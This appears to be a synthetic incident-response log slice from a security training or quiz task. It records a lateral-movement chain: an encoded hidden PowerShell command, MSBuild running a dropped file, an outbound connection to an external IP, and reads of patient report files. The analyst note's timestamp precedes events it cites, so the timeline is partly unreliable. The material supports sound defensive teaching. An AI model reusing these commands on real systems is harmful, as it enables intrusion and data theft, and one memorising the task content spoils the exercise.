@@ -1,0 +1,26 @@
+# Authentication and EDR expansion slice
+# Query window: 2026-04-14T03:20:00Z to 2026-04-14T03:45:00Z
+# Surfaced at: 2026-04-14T03:34:12Z by on-call analyst while reviewing preserved auth logs
+# Sources: ad_dc01, ad_dc02, wazuh_edr
+# Referenced by: IR-2026-0414-01 Task 5 (scope expansion)
+#
+# Format per line:
+#   [source] ISO8601Z  event_type  key=value ...
+#
+[auth] 2026-04-14T03:22:47Z TGS_REQ  user=MEDDEFENSE\dmarsh  spn=cifs/WST-WS-017   source=WST-WS-031  src_ip=10.42.118.31  encryption=AES256_HMAC_SHA1  result=success
+[auth] 2026-04-14T03:22:48Z TGS_REQ  user=MEDDEFENSE\dmarsh  spn=host/WST-WS-017   source=WST-WS-031  src_ip=10.42.118.31  encryption=AES256_HMAC_SHA1  result=success
+[auth] 2026-04-14T03:23:01Z LOGON    user=MEDDEFENSE\dmarsh  target=WST-WS-017     logon_type=3  event_id=4624  src_ip=10.42.118.31  auth_package=Kerberos  logon_id=0x7a2d18  result=success
+[auth] 2026-04-14T03:23:02Z SMB_SESSION_SETUP  user=MEDDEFENSE\dmarsh  target=WST-WS-017  share=ADMIN$  result=success
+[edr]  2026-04-14T03:23:44Z PROCESS_CREATE  host=WST-WS-017  user=MEDDEFENSE\dmarsh  image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  pid=4402  ppid=720  parent_image=C:\Windows\System32\services.exe  cmdline="powershell.exe -ep bypass -w hidden -enc JABzAD0AIgBoAHQAdABwAHMAOgAvAC8AOQAxAC4AMgAzADQALgA5ADkALgAxADAANwAvAHoAIgA7AA=="
+[edr]  2026-04-14T03:23:59Z FILE_CREATE  host=WST-WS-017  user=MEDDEFENSE\dmarsh  image=powershell.exe  target=C:\Users\dmarsh\AppData\Local\Temp\update.xml  sha256=a4f1e9b4fe7aa6d5d3f3e2b8c9a7d4e8f5b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3
+[edr]  2026-04-14T03:24:12Z PROCESS_CREATE  host=WST-WS-017  user=MEDDEFENSE\dmarsh  image=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe  pid=5108  ppid=4402  parent_image=powershell.exe  cmdline="msbuild.exe C:\Users\dmarsh\AppData\Local\Temp\update.xml"
+[edr]  2026-04-14T03:27:13Z NETWORK_CONNECTION  host=WST-WS-017  user=MEDDEFENSE\dmarsh  image=MSBuild.exe  pid=5108  protocol=TCP  direction=outbound  local_ip=10.42.118.17  local_port=55401  remote_ip=91.234.99.107  remote_port=443  state=ESTABLISHED
+[auth] 2026-04-14T03:40:18Z TGS_REQ  user=MEDDEFENSE\dmarsh  spn=cifs/LIS-WSIDE-01  source=WST-WS-017  src_ip=10.42.118.17  encryption=AES256_HMAC_SHA1  result=success
+[auth] 2026-04-14T03:41:52Z TGS_REQ  user=MEDDEFENSE\dmarsh  spn=cifs/LIS-WSIDE-01  source=WST-WS-017  src_ip=10.42.118.17  encryption=AES256_HMAC_SHA1  result=success  note=second_request_with_ticket_reuse
+[auth] 2026-04-14T03:42:08Z LOGON    user=MEDDEFENSE\dmarsh  target=LIS-WSIDE-01   logon_type=3  event_id=4624  src_ip=10.42.118.17  auth_package=Kerberos  logon_id=0x91f204  result=success
+[file] 2026-04-14T03:43:30Z FILE_ACCESS  host=LIS-WSIDE-01  user=MEDDEFENSE\dmarsh  event_id=4663  access_mask=0x1 (read)  target_path=C:\LIS\reports\daily\*.pdf  files_opened=14  share=LIS_REPORTS$  result=success
+[file] 2026-04-14T03:43:34Z FILE_ACCESS  host=LIS-WSIDE-01  user=MEDDEFENSE\dmarsh  event_id=4663  access_mask=0x1 (read)  target_path=C:\LIS\reports\daily\MRN_redacted\2026-04-13_results.pdf  result=success
+[file] 2026-04-14T03:43:41Z FILE_ACCESS  host=LIS-WSIDE-01  user=MEDDEFENSE\dmarsh  event_id=4663  access_mask=0x1 (read)  target_path=C:\LIS\reports\daily\MRN_redacted\2026-04-13_microbio.pdf  result=success
+# End of expansion slice.
+# Analyst note (03:34:12Z): Pass-the-Ticket indicated by consecutive TGS_REQ events from a non-authorized source
+# host. PHI read on LIS-WSIDE-01 triggers regulatory posture reassessment (Task 5 MCQ).
